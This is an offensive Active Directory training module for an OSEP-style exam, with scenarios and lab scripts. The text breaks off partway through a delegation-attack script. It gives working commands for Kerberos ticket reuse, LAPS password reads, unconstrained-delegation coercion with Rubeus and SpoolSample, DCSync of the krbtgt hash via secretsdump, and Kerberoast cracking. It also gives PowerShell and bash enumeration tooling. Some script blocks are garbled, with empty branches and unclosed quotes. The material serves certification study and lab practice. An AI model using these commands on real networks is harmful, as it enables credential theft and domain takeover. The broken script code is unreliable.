::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# Module 12 — Active Directory

Set up the attacker box per [00](/modules/00-environment-and-infra). Placeholders: `LHOST` `LPORT` `TARGET` `DOMAIN` `USER` `PASS` `NTHASH`.

Most of this module is Kali (Impacket + Certipy). Only “coerce auth / catch a ticket” has to run on a Windows host. Write down **where the ticket came from, which service it is for, and whose identity it is** before you type a command.

| Sit. | Goal | Lab files |
|---|---|---|
| 47 | Linux tickets → Windows service | `m12-kerberos-tickets-linux.sh` |
| 49 | Read LAPS → local admin | `m12-ad-enum-windows.ps1` / `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
| 50 | Unconstrained delegation → DC TGT → DCSync | `m12-delegation-attacks.ps1` |
| 51 | RBCD: write AllowedToAct → impersonate admin | `m12-delegation-attacks.ps1` |
| 52 | Constrained delegation S4U → listed SPN | `m12-delegation-attacks.ps1` |
| 53 | Child domain → forest root (trust + Extra SID) | `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
| 54 | ESC1 template → cert auth | `m12-adcs-esc1-esc8.sh` |
| 55 | ESC8 HTTP enrollment relay | `m12-adcs-esc1-esc8.sh` |

---

## Scenario 47: You have a domain ticket on Linux and need a Windows service

**Situation**: Domain-joined Linux with a usable ccache/keytab. Next hop is Windows (SMB/WinRM/HTTP). No cleartext password.

**Assumptions**: Clock skew vs DC < 5 minutes; you can reach TCP/UDP 88 and the target 445/5985; you know `DOMAIN` and the DC FQDN. Kerberos needs the **FQDN that matches the SPN**, not an IP.

**Prepare (attacker)**:
```bash
export KRB5CCNAME=/home/kali/osep/tickets/current.ccache
klist -e
```
Minimal `/etc/krb5.conf` and `/etc/hosts` templates are in `m12-kerberos-tickets-linux.sh`.

**Procedure**:
```bash
smbclient -k -L //WS02.corp.local
impacket-wmiexec -k -no-pass DOMAIN/USER@WS02.corp.local
impacket-secretsdump -k -no-pass DC01.corp.local
evil-winrm -i ws02.corp.local -k
```

**Lab files**: `m12-kerberos-tickets-linux.sh`

**Verify**: `smbclient -k -L` lists shares / `wmiexec` gives a shell. `KRB_AP_ERR_MODIFIED` is almost always SPN / etype / hostname, not “the network”.

**If it fails**:
- Ticket present but no access → FQDN vs SPN; ACL of the ticket identity; try another service.
- KDC rejects etype → add `rc4-hmac` or `aes256-cts-hmac-sha1-96` in `krb5.conf`.
- Clock skew too great → `sudo ntpdate DC01`.
- Target only on an internal segment → pivot first ([08](/modules/08-pivoting-tunneling)), then Kerberos. The pivot must still reach DC:88.

**Exam notes / OPSEC**: Prove identity with a harmless `smbclient -L` before execution tools. One ccache file per session. `export KRB5CCNAME` then `klist` every time you switch tickets.

---

#### `m12-kerberos-tickets-linux.sh` {#m12-kerberos-tickets-linux-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
#       （smbclient / wmiexec / psexec / smbexec / secretsdump / evil-winrm），
#       impacket（impacket-ticketConverter / -getTGT / -getST / -wmiexec / -psexec /
#       -smbexec / -secretsdump，Kali: sudo apt install -y impacket-scripts）；
#       ./m12-kerberos-tickets-linux.sh -m krb5conf -d corp.local -s DC01.corp.local -o /tmp/krb5.conf
#       ./m12-kerberos-tickets-linux.sh -m convert -T dc.kirbi -o dc.ccache
#       ./m12-kerberos-tickets-linux.sh -m auth -d corp.local -s DC01.corp.local -t WS02.corp.local
#       ./m12-kerberos-tickets-linux.sh -m tgs -S cifs/WS02.corp.local -d corp.local
# =============================================================================
set -u

MODE="info"
DOMAIN=""
DC=""
TGT_HOST=""
USER=""         # -u
PASS=""         # -p
NTHASH=""       # -H
CCACHE=""
KEYTAB=""
TICKET=""
OUTFILE=""
SPN=""
DCIP=""
EXEC=0
TICKET_DIR="$HOME/osep/tickets"

usage() {
    sed -n '2,32p' "$0" | sed 's/^# \{0,1\}//'
    cat <<'EOF'


EOF
    exit 0
}

err()  { printf '[!] %s\n' "$*" >&2; }
info() { printf '[*] %s\n' "$*"; }
head_() { printf '\n===== %s =====\n' "$*"; }
have() { command -v "$1" >/dev/null 2>&1; }

printable() {
    local out="" a
    for a in "$@"; do
        case "$a" in
            *" "*|*"'"*|*'"'*) out="$out '$a'" ;;
            *)                 out="$out $a" ;;
        esac
    done
    printf '%s\n' "${out# }"
}

run() {
    printable "$@"
    if [ "$EXEC" != "1" ]; then return 0; fi
    if ! have "$1"; then
        return 0
    fi
    return 0
}

while getopts "m:d:s:t:u:p:H:c:k:T:o:S:i:xh" opt; do
    case "$opt" in
        m) MODE="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        s) DC="$OPTARG" ;;
        t) TGT_HOST="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        H) NTHASH="$OPTARG" ;;
        c) CCACHE="$OPTARG" ;;
        k) KEYTAB="$OPTARG" ;;
        T) TICKET="$OPTARG" ;;
        o) OUTFILE="$OPTARG" ;;
        S) SPN="$OPTARG" ;;
        i) DCIP="$OPTARG" ;;
        x) EXEC=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

REALM=""
if [ -n "$DOMAIN" ]; then
    REALM="$(printf '%s' "$DOMAIN" | tr '[:lower:]' '[:upper:]')"
fi

if [ -n "$CCACHE" ]; then
    KRB5CCNAME="$CCACHE"
    export KRB5CCNAME
elif [ -n "${KRB5CCNAME:-}" ]; then
    CCACHE="$KRB5CCNAME"
else
    CCACHE="$TICKET_DIR/current.ccache"
fi

require_mode_arg() {
    local missing=""
    while [ "$#" -gt 0 ]; do
        case "$1" in
            DOMAIN) [ -z "$DOMAIN" ] && missing="$missing -d" ;;
            DC)     [ -z "$DC" ]     && missing="$missing -s" ;;
            TARGET) [ -z "$TGT_HOST" ] && missing="$missing -t" ;;
            USER)   [ -z "$USER" ]   && missing="$missing -u" ;;
            PASS)   [ -z "$PASS" ]   && missing="$missing -p" ;;
            SPN)    [ -z "$SPN" ]    && missing="$missing -S" ;;
            TICKET) [ -z "$TICKET" ] && missing="$missing -T" ;;
            OUTFILE)[ -z "$OUTFILE" ] && missing="$missing -o" ;;
        esac
        shift
    done
    if [ -n "$missing" ]; then
        exit 1
    fi
}

# ---------------------------------------------------------------------------
mode_info() {
    if [ ! -f "$CCACHE" ]; then
    fi
    run klist -e
    echo
    run date
    if [ -n "$DC" ]; then
    else
    fi
    echo
}

# ---------------------------------------------------------------------------
mode_krb5conf() {
    require_mode_arg DOMAIN DC
    local conf
    conf="$(cat <<EOF
[libdefaults]
    default_realm = $REALM
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_tkt_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    default_tgs_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    permitted_enctypes  = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    udp_preference_limit = 1
    kdc_timesync = 1
    ccache_type = 4
    rdns = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    $REALM = {
        kdc = $DC
        admin_server = $DC
        default_domain = $DOMAIN
    }

[domain_realm]
    .$DOMAIN = $REALM
    $DOMAIN = $REALM
EOF
)"
    printf '%s\n' "$conf"
    if [ -n "$OUTFILE" ]; then
        printf '%s\n' "$conf" > "$OUTFILE" \
    else
    fi
    echo
}

# ---------------------------------------------------------------------------
mode_hosts() {
    require_mode_arg DOMAIN DC
    local ip1="$DCIP"
    [ -z "$ip1" ] && ip1="TARGET"
    echo "
    echo "$ip1    $DC    ${DC%%.*}"
    if [ -n "$TGT_HOST" ]; then
        echo "TARGET    $TGT_HOST    ${TGT_HOST%%.*}"
    fi
    echo
    echo "
    echo "sudo sh -c 'echo \"$ip1    $DC    ${DC%%.*}\" >> /etc/hosts'"
    if [ -n "$TGT_HOST" ]; then
        echo "sudo sh -c 'echo \"TARGET    $TGT_HOST    ${TGT_HOST%%.*}\" >> /etc/hosts'"
    fi
    echo
    echo "sudo sh -c 'echo \"nameserver TARGET\" > /etc/resolv.conf'
    echo "
    echo
}

# ---------------------------------------------------------------------------
mode_kinit() {
    require_mode_arg DOMAIN USER PASS
    run kinit "$USER@$REALM"
    echo
    run klist -e
    echo
}

# ---------------------------------------------------------------------------
mode_keytab() {
    require_mode_arg DOMAIN USER PASS
    local kt="$OUTFILE"
    [ -z "$kt" ] && kt="$TICKET_DIR/$USER.keytab"
    echo "
    echo "ktutil"
    echo "  addent -password -p $USER@$REALM -k 1 -e rc4-hmac"
    echo "  wkt $kt"
    echo "  quit"
    echo
    echo "kinit $USER@$REALM -k -t $kt"
    echo "klist -e"
    echo
    echo "printf 'addent -password -p %s@%s -k 1 -e rc4-hmac\\n%s\\nwkt %s\\nquit\\n' \\" "$USER" "$REALM" "PASS" "$kt"
    echo "  | ktutil"
    echo
    mkdir -p "$TICKET_DIR" 2>/dev/null || true
}

# ---------------------------------------------------------------------------
mode_convert() {
    require_mode_arg TICKET
    local out="$OUTFILE"
    [ -z "$out" ] && out="${TICKET%.*}.ccache"
    case "$TICKET" in
        *.kirbi|*.kirby)
            run impacket-ticketConverter "$TICKET" "$out"
            ;;
        *.ccache)
            run impacket-ticketConverter "$TICKET" "$out"
            ;;
        *.txt|*.b64)
            echo "base64 -d $TICKET > ${TICKET%.*}.kirbi"
            run impacket-ticketConverter "${TICKET%.*}.kirbi" "$out"
            ;;
        *)
            run impacket-ticketConverter "$TICKET" "$out"
            ;;
    esac
    echo
}

# ---------------------------------------------------------------------------
mode_tgt() {
    require_mode_arg DOMAIN DC USER
    if [ -z "$PASS" ] && [ -z "$NTHASH" ]; then
    fi
    local out="$OUTFILE"
    [ -z "$out" ] && out="$TICKET_DIR/$USER.ccache"
    if [ -n "$NTHASH" ]; then
        run impacket-getTGT -dc-ip "$DC" -hashes ":$NTHASH" "$DOMAIN/$USER"
    else
        run impacket-getTGT -dc-ip "$DC" "$DOMAIN/$USER:$PASS"
    fi
    echo
    echo "mv $USER.ccache $out && export KRB5CCNAME=$out && klist -e"
}

# ---------------------------------------------------------------------------
mode_tgs() {
    require_mode_arg SPN
    run kvno "$SPN"
    echo
    if [ -n "$USER" ]; then
        local cred="$DOMAIN/$USER"
        [ -n "$PASS" ] && cred="$cred:$PASS"
        run impacket-getST -spn "$SPN" -dc-ip "$DC" "$cred"
    else
        echo "impacket-getST -spn $SPN -impersonate USER -dc-ip TARGET 'DOMAIN/SVC:PASS'"
    fi
    echo
    run klist -e
}

# ---------------------------------------------------------------------------
mode_auth() {
    require_mode_arg DOMAIN TARGET
    local u="$USER"
    [ -z "$u" ] && u="USER"
    echo
    echo "
    run smbclient -k -L "//$TGT_HOST"
    echo
    echo "
    run impacket-wmiexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
    run impacket-smbexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
    run impacket-psexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
    echo
    echo "
    [ -z "$DC" ] && DC="$TGT_HOST"
    run impacket-secretsdump -k -no-pass "$DC"
    run impacket-secretsdump -k -no-pass -just-dc-user krbtgt "$DC"
    echo
    echo "
    run evil-winrm -i "$TGT_HOST" -r "$DOMAIN" -k
    echo
    echo "impacket-wmiexec $DOMAIN/USER@$TGT_HOST -hashes :NTHASH"
    echo
    info "  · Clock skew -> sudo ntpdate $DC"
}

# ---------------------------------------------------------------------------
mode_cross() {
    run klist -e
    echo
    echo
    echo "   export KRB5CCNAME=Administrator.ccache"
    echo
}

# ---------------------------------------------------------------------------
case "$MODE" in
    info)     mode_info ;;
    krb5conf) mode_krb5conf ;;
    hosts)    mode_hosts ;;
    kinit)    mode_kinit ;;
    keytab)   mode_keytab ;;
    convert)  mode_convert ;;
    tgt)      mode_tgt ;;
    tgs)      mode_tgs ;;
    auth)     mode_auth ;;
    cross)    mode_cross ;;
    all)      mode_info; mode_krb5conf; mode_hosts; mode_auth ;;
esac

````

## Scenario 49: No local privesc, but the user can read LAPS

**Situation**: Domain user, no local privesc. ACL lets you read **another host’s** local Administrator password.

**Assumptions**: LAPS is deployed and you have ReadProperty on the password attribute. That password is the **machine’s local Administrator**, not a domain user. Distinguish legacy (`ms-Mcs-AdmPwd*`) vs Windows LAPS (`msLAPS-Password*`).

**Prepare**: LDAP from Kali; `wmiexec` if 445 is open, WinRM if only 5985. On Windows: `m12-ad-enum-windows.ps1`.

**Procedure**:
```bash
ldapsearch -x -H ldap://DC01.corp.local -D "CORP\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(objectClass=computer)" \
  ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-EncryptedPassword
impacket-wmiexec CORP/Administrator@WS02.corp.local -p 'PASS'
```
Windows: `m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02`.

**Lab files**: `m12-ad-enum-windows.ps1`, `m12-ad-enum-linux.sh`, `m12-laps-and-trust-notes.md`

**Verify**: The password opens **that** machine. LAPS secrets are per-host.

**If it fails**:
- Empty attribute → LAPS not enabled / not rotated; scan `(ms-Mcs-AdmPwd=*)` or escalate first.
- Only `msLAPS-EncryptedPassword` → don’t grind decryption; find a legacy or cleartext-policy host.
- WinRM only → `evil-winrm`. Neither protocol → the password is useless right now.

**Exam notes / OPSEC**: LDAP reads are logged. Don’t spray every LAPS password. Don’t leave the secret in shell history.

---

#### `m12-ad-enum-windows.ps1` {#m12-ad-enum-windows-ps1}

````powershell
<#
      .\m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02
      .\m12-ad-enum-windows.ps1 -Mode Delegation
      .\m12-ad-enum-windows.ps1 -Mode ACL -AclTarget "CN=WS02,CN=Computers,DC=corp,DC=local"
      .\m12-ad-enum-windows.ps1 -Mode Users -MaxResults 50 -Domain corp.local
#>
[CmdletBinding()]
param(
    [ValidateSet('All','Domain','Users','Groups','Computers','SPN','Delegation','ACL','LAPS','Help')]
    [string]$Mode = 'All',
    [string]$ComputerName = '',
    [string]$Domain = '',
    [string]$SearchRoot = '',
    [string]$AclTarget = '',
    [int]$MaxResults = 0,
    [switch]$Help
)

$ErrorActionPreference = 'Continue'

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
$script:RootPath = ''
$script:DomainSID = ''
$script:DomainFqdn = ''

function Initialize-M12Root {
    if ($SearchRoot) {
        $script:RootPath = "LDAP://$SearchRoot"
    } elseif ($Domain) {
        # corp.local -> DC=corp,DC=local
        $parts = $Domain.Split('.') | Where-Object { $_ -ne '' }
        $dn = ($parts | ForEach-Object { "DC=$_" }) -join ','
        $script:RootPath = "LDAP://$dn"
        $script:DomainFqdn = $Domain
    } else {
        $rootDse = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
        $nc = $rootDse.Properties['defaultNamingContext']
        if (-not $nc -or $nc.Count -eq 0) {
        }
        $script:RootPath = "LDAP://$($nc[0])"
        $script:DomainFqdn = (($nc[0] -split ',') | Where-Object { $_ -like 'DC=*' } |
            ForEach-Object { $_.Substring(3) }) -join '.'
    }
    $domEntry = New-Object System.DirectoryServices.DirectoryEntry($script:RootPath)
    $sidBytes = $domEntry.Properties['objectSid'].Value
    if ($sidBytes) {
        $script:DomainSID = (New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)).Value
    }
    if (-not $script:DomainFqdn) {
        $script:DomainFqdn = (($script:RootPath -split ',') | Where-Object { $_ -like 'DC=*' } |
            ForEach-Object { $_.Substring(4) }) -join '.'
    }
}

function New-M12Searcher {
    param(
        [Parameter(Mandatory = $true)][string]$Filter,
        [string[]]$Properties = @('sAMAccountName'),
        [int]$PageSize = 200
    )
    $entry = New-Object System.DirectoryServices.DirectoryEntry($script:RootPath)
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = $entry
    $s.Filter = $Filter
    $s.PageSize = $PageSize
    $s.SearchScope = [System.DirectoryServices.SearchScope]::Subtree
    foreach ($p in $Properties) { [void]$s.PropertiesToLoad.Add($p) }
    return $s
}

function Get-M12Prop {
    param($Result, [string]$Name)
    if ($Result.Properties.Contains($Name) -and $Result.Properties[$Name].Count -gt 0) {
        return $Result.Properties[$Name][0]
    }
    return $null
}

function Convert-M12FileTime {
    param($Raw)
    if (-not $Raw) { return '' }
    try {
        $ft = [Convert]::ToInt64($Raw)
        if ($ft -le 0) { return '' }
        return [DateTime]::FromFileTime($ft).ToString('yyyy-MM-dd HH:mm:ss')
    } catch { return [string]$Raw }
}

function Convert-M12Uac {
    param($Raw)
    if (-not $Raw) { return '' }
    $v = 0
    try { $v = [Convert]::ToInt32($Raw) } catch { return [string]$Raw }
    $flags = @()
    if ($v -band 0x000002)  { $flags += 'DISABLED' }
    if ($v -band 0x000020)  { $flags += 'PasswdNotReqd' }
    if ($v -band 0x002000)  { $flags += 'PASSWD_NOT_EXPIRED' }
    if ($v -band 0x020000)  { $flags += 'DONT_REQ_PREAUTH(ASREP)' }
    if ($v -band 0x100000)  { $flags += 'USE_DES_ONLY' }
    return ($flags -join ',')
}

function Write-M12Head {
    param([string]$Text)
    Write-Output ""
    Write-Output "===== $Text ====="
}

function Limit-M12Rows {
    param($Rows)
    if ($MaxResults -gt 0) { return @($Rows | Select-Object -First $MaxResults) }
    return @($Rows)
}

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
function Get-M12DomainInfo {
    $me = [System.Security.Principal.WindowsIdentity]::GetCurrent()

    $s = New-M12Searcher -Filter '(objectClass=domainDNS)' `
        -Properties @('distinguishedName','ms-DS-MachineAccountQuota','msDS-Behavior-Version')
    $r = $s.FindOne()
    if ($r) {
        $maq = Get-M12Prop $r 'ms-DS-MachineAccountQuota'
        if ($maq) {
        } else {
        }
        $func = Get-M12Prop $r 'msDS-Behavior-Version'
    }

    Write-Output ""
    $s2 = New-M12Searcher -Filter '(&(objectCategory=computer)(primaryGroupID=516))' `
        -Properties @('dnsHostName','operatingSystem')
    foreach ($c in $s2.FindAll()) {
        Write-Output ("DC  : " + (Get-M12Prop $c 'dnsHostName'))
    }
}

# ---------------------------------------------------------------------------
# Users
# ---------------------------------------------------------------------------
function Get-M12Users {
    $s = New-M12Searcher -Filter '(&(objectCategory=person)(objectClass=user))' `
        -Properties @('sAMAccountName','userPrincipalName','description','adminCount','pwdLastSet','lastLogon','userAccountControl','servicePrincipalName')
    $rows = @()
    foreach ($r in $s.FindAll()) {
        $rows += New-Object PSObject -Property @{
            SamAccountName = (Get-M12Prop $r 'sAMAccountName')
            UPN            = (Get-M12Prop $r 'userPrincipalName')
            AdminCount     = (Get-M12Prop $r 'adminCount')
            UAC            = (Convert-M12Uac (Get-M12Prop $r 'userAccountControl'))
            LastLogon      = (Convert-M12FileTime (Get-M12Prop $r 'lastLogon'))
            Description    = (Get-M12Prop $r 'description')
        }
    }
    Limit-M12Rows $rows | Sort-Object SamAccountName |
        Format-Table -AutoSize SamAccountName, UPN, AdminCount, UAC, LastLogon, Description |
        Out-String -Width 220 | Write-Output
    $s3 = New-M12Searcher -Filter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' `
        -Properties @('sAMAccountName')
    foreach ($r in $s3.FindAll()) { Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName')) }
}

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
function Get-M12Groups {
    if (-not $script:DomainSID) {
        return
    }
    $rids = @{
        '512' = 'Domain Admins'
        '519' = 'Enterprise Admins'
        '518' = 'Schema Admins'
        '544' = 'Builtin Administrators'
    }
    foreach ($rid in ($rids.Keys | Sort-Object)) {
        $sid = "$script:DomainSID-$rid"
        $s = New-M12Searcher -Filter "(objectSid=$sid)" -Properties @('sAMAccountName','member','description')
        $r = $s.FindOne()
        if (-not $r) { continue }
        Write-Output ("--- {0} ({1}) ---" -f $rids[$rid], (Get-M12Prop $r 'sAMAccountName'))
        $members = $r.Properties['member']
        if ($members) { foreach ($m in $members) { Write-Output ("  " + $m) } }
    }

    $s2 = New-M12Searcher -Filter '(objectClass=group)' -Properties @('sAMAccountName','member','adminCount')
    $rows = @()
    foreach ($r in $s2.FindAll()) {
        $rows += New-Object PSObject -Property @{
            Group      = (Get-M12Prop $r 'sAMAccountName')
            AdminCount = (Get-M12Prop $r 'adminCount')
            Members    = ($r.Properties['member']).Count
        }
    }
    Limit-M12Rows $rows | Sort-Object Group | Format-Table -AutoSize Group, AdminCount, Members |
        Out-String -Width 160 | Write-Output
}

# ---------------------------------------------------------------------------
# Computers
# ---------------------------------------------------------------------------
function Get-M12Computers {
    $s = New-M12Searcher -Filter '(objectClass=computer)' `
        -Properties @('sAMAccountName','dnsHostName','operatingSystem','operatingSystemVersion','lastLogon','distinguishedName')
    $rows = @()
    foreach ($r in $s.FindAll()) {
        $rows += New-Object PSObject -Property @{
            Name      = (Get-M12Prop $r 'sAMAccountName')
            DnsHost   = (Get-M12Prop $r 'dnsHostName')
            OS        = (Get-M12Prop $r 'operatingSystem')
            OSVer     = (Get-M12Prop $r 'operatingSystemVersion')
            LastLogon = (Convert-M12FileTime (Get-M12Prop $r 'lastLogon'))
        }
    }
    Limit-M12Rows $rows | Sort-Object Name | Format-Table -AutoSize Name, DnsHost, OS, OSVer, LastLogon |
        Out-String -Width 200 | Write-Output
}

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
function Get-M12Spn {
    $s = New-M12Searcher -Filter '(&(servicePrincipalName=*)(!(objectClass=computer)))' `
        -Properties @('sAMAccountName','servicePrincipalName','adminCount','pwdLastSet','userAccountControl','memberOf')
    foreach ($r in $s.FindAll()) {
        $spns = @($r.Properties['servicePrincipalName']) -join ' | '
        Write-Output ("  SPN    : " + $spns)
        $uac = Convert-M12Uac (Get-M12Prop $r 'userAccountControl')
        if ($uac) { Write-Output ("  UAC    : " + $uac) }
        $mo = $r.Properties['memberOf']
    }
    Write-Output ""
    Write-Output "               hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt"
}

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
function Get-M12Delegation {
    $s = New-M12Searcher -Filter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' `
        -Properties @('sAMAccountName','dnsHostName','distinguishedName')
    $found = $false
    foreach ($r in $s.FindAll()) {
        $found = $true
        Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName') + "  " + (Get-M12Prop $r 'dnsHostName'))
    }

    $s2 = New-M12Searcher -Filter '(msDS-AllowedToDelegateTo=*)' `
        -Properties @('sAMAccountName','msDS-AllowedToDelegateTo','userAccountControl')
    $found = $false
    foreach ($r in $s2.FindAll()) {
        $found = $true
        $uac = Convert-M12Uac (Get-M12Prop $r 'userAccountControl')
    }

    $s3 = New-M12Searcher -Filter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' `
        -Properties @('sAMAccountName','dnsHostName','distinguishedName')
    $found = $false
    foreach ($r in $s3.FindAll()) {
        $found = $true
        Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName') + "  " + (Get-M12Prop $r 'dnsHostName'))
        Write-Output ("      DN : " + (Get-M12Prop $r 'distinguishedName'))
    }
    Write-Output ""
}

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
function Get-M12AclSummary {
    $target = $AclTarget
    if (-not $target) { $target = $script:RootPath -replace '^LDAP://', '' }
    $interesting = @('GenericAll','GenericWrite','WriteDacl','WriteOwner','ExtendedRight','CreateChild','Delete','WriteProperty','Self')
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$target")
    try {
        $rules = $de.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
    } catch {
        return
    }
    $rows = @()
    foreach ($rule in $rules) {
        $rights = [string]$rule.ActiveDirectoryRights
        $hit = ''
        foreach ($i in $interesting) {
            if (($rule.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]$i) -ne 0) {
                $hit = 'YES'
                break
            }
        }
        if (-not $hit) { continue }
        $who = $rule.IdentityReference.Value
        try { $who = $rule.IdentityReference.Translate([System.Security.Principal.NTAccount]).Value } catch { }
        $rows += New-Object PSObject -Property @{
            Principal = $who
            Rights    = $rights
            Type      = [string]$rule.AccessControlType
            ObjectType= [string]$rule.ObjectType
            Inherited = $rule.IsInherited
        }
    }
    if ($rows.Count -eq 0) {
    } else {
        $rows | Sort-Object Principal | Format-Table -AutoSize Principal, Rights, Type, ObjectType, Inherited |
            Out-String -Width 220 | Write-Output
    }
}

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
function Get-M12Laps {

    $name = $ComputerName
    if ($name -and -not $name.EndsWith('$')) { $name = "$name`$" }
    if ($name) {
        $filter = "(&(objectClass=computer)(sAMAccountName=$name))"
    } else {
        $filter = '(|(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*)(ms-Mcs-AdmPwd=*)(msLAPS-Password=*))'
    }
    $props = @('sAMAccountName','dnsHostName','distinguishedName',
               'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime',
               'msLAPS-Password','msLAPS-PasswordExpirationTime','msLAPS-EncryptedPassword')
    $s = New-M12Searcher -Filter $filter -Properties $props

    $legacyHits = 0
    $winlapsHits = 0
    $encHits = 0
    $lastDns = 'TARGET'
    foreach ($r in $s.FindAll()) {
        $host1 = Get-M12Prop $r 'sAMAccountName'
        $dns   = Get-M12Prop $r 'dnsHostName'
        if ($dns) { $lastDns = $dns }
        $pwd   = Get-M12Prop $r 'ms-Mcs-AdmPwd'
        $exp   = Convert-M12FileTime (Get-M12Prop $r 'ms-Mcs-AdmPwdExpirationTime')
        $wpwd  = Get-M12Prop $r 'msLAPS-Password'
        $wexp  = Get-M12Prop $r 'msLAPS-PasswordExpirationTime'
        $wenc  = Get-M12Prop $r 'msLAPS-EncryptedPassword'

        if ($pwd) {
            $legacyHits++
        }
        if ($wpwd) {
            $winlapsHits++
        }
        if ($wenc) {
            $encHits++
        }
        if (-not $pwd -and -not $wpwd -and -not $wenc) {
        }
    }

    Write-Output ""
    if (($legacyHits + $winlapsHits) -gt 0) {
    } elseif ($encHits -gt 0) {
        Write-Output "         Get-AdmPwdPassword -ComputerName TARGET"
    } else {
    }

    Write-Output ""
    foreach ($p in @('C:\Program Files\LAPS\CSE\Admpwd.dll', 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll')) {
    }
}

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
function Show-M12Help {
    Write-Output @"


  .\m12-ad-enum-windows.ps1 -Mode All
  .\m12-ad-enum-windows.ps1 -Mode Domain     [-Domain corp.local]
  .\m12-ad-enum-windows.ps1 -Mode Users      [-MaxResults 50]
  .\m12-ad-enum-windows.ps1 -Mode Groups
  .\m12-ad-enum-windows.ps1 -Mode Computers
  .\m12-ad-enum-windows.ps1 -Mode SPN
  .\m12-ad-enum-windows.ps1 -Mode Delegation
  .\m12-ad-enum-windows.ps1 -Mode ACL [-AclTarget "CN=WS02,CN=Computers,DC=corp,DC=local"]
  .\m12-ad-enum-windows.ps1 -Mode LAPS [-ComputerName WS02]

"@
}

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
if ($Help) { Show-M12Help; return }

try {
    Initialize-M12Root
} catch {
    exit 1
}

switch ($Mode) {
    'All'       { Get-M12DomainInfo; Get-M12Users; Get-M12Groups; Get-M12Computers
                  Get-M12Spn; Get-M12Delegation; Get-M12AclSummary; Get-M12Laps }
    'Domain'    { Get-M12DomainInfo }
    'Users'     { Get-M12Users }
    'Groups'    { Get-M12Groups }
    'Computers' { Get-M12Computers }
    'SPN'       { Get-M12Spn }
    'Delegation'{ Get-M12Delegation }
    'ACL'       { Get-M12AclSummary }
    'LAPS'      { Get-M12Laps }
    'Help'      { Show-M12Help }
}

Write-Output ""
````

## Scenario 50: You control an unconstrained-delegation host, no domain admin yet

**Situation**: Host is Trusted for Delegation. You need a high-value TGT (DC$ or DA).

**Assumptions**: You can run as SYSTEM on that host. A DC machine TGT ⇒ DCSync; a DA TGT ⇒ impersonation.

**Prepare**: `Rubeus.exe` + a coerce tool (`SpoolSample` / printerbug / PetitPotam) on the host; `ticketConverter` + `secretsdump` on Kali.

**Procedure**:
```powershell
Rubeus.exe monitor /interval:5 /nowrap
SpoolSample.exe DC01 $env:COMPUTERNAME
```
```bash
impacket-ticketConverter dc.txt dc.ccache
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass DC01.corp.local
```

**Lab files**: `m12-delegation-attacks.ps1`

**Verify**: `klist` shows `DC01$`; `secretsdump` yields `krbtgt`.

**If it fails**: Patch/RPC blocked → PetitPotam / DFSCoerce / wait for a real DA logon. Ordinary user TGT → use it laterally or keep monitoring. Host cannot reach the DC → stop coercing; enumerate another path.

**Exam notes / OPSEC**: Stop `monitor` as soon as you have the DC ticket. Export to Kali and wipe local base64.

---

#### `m12-delegation-attacks.ps1` {#m12-delegation-attacks.ps1}

````powershell
<#
      .\m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'
      .\m12-delegation-attacks.ps1 -Mode RBCD-Rollback -TargetComputer WS02
      .\m12-delegation-attacks.ps1 -Mode Constrained -ServiceAccount svc_sql -Spn 'cifs/WS02.corp.local'
      .\m12-delegation-attacks.ps1 -Mode Unconstrained -ToolDir C:\Tools -Execute
      .\m12-delegation-attacks.ps1 -Mode Enum
#>
[CmdletBinding()]
param(
    [ValidateSet('Enum','RBCD','RBCD-Rollback','Constrained','Unconstrained','Help')]
    [string]$Mode = 'Enum',
    [string]$TargetComputer = '',
    [string]$FakeAccount = '',
    [string]$ServiceAccount = '',
    [string]$ImpersonateUser = 'Administrator',
    [string]$Spn = '',
    [string]$Domain = '',
    [string]$ToolDir = '.',
